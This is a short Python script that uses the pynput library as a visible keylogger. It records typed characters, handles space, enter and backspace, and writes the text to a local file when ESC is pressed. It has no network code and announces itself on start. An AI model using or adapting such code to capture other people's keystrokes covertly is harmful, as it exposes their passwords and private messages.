from pynput import keyboard

log_file = "keys_log.txt"
current_text = ""

def on_press(key):
    global current_text
    
    try:
        current_text += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            current_text += " "
        elif key == keyboard.Key.enter:
            current_text += "\n"
        elif key == keyboard.Key.backspace:
            current_text = current_text[:-1]   # remove last char
        elif key == keyboard.Key.esc:
            pass
        else:
            pass  # ignore other special keys

def on_release(key):
    if key == keyboard.Key.esc:
        with open(log_file, "a") as f:
            f.write(current_text)
        print("\nProgram stopped")
        return False

print("Logging keys... (Press ESC to stop)")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()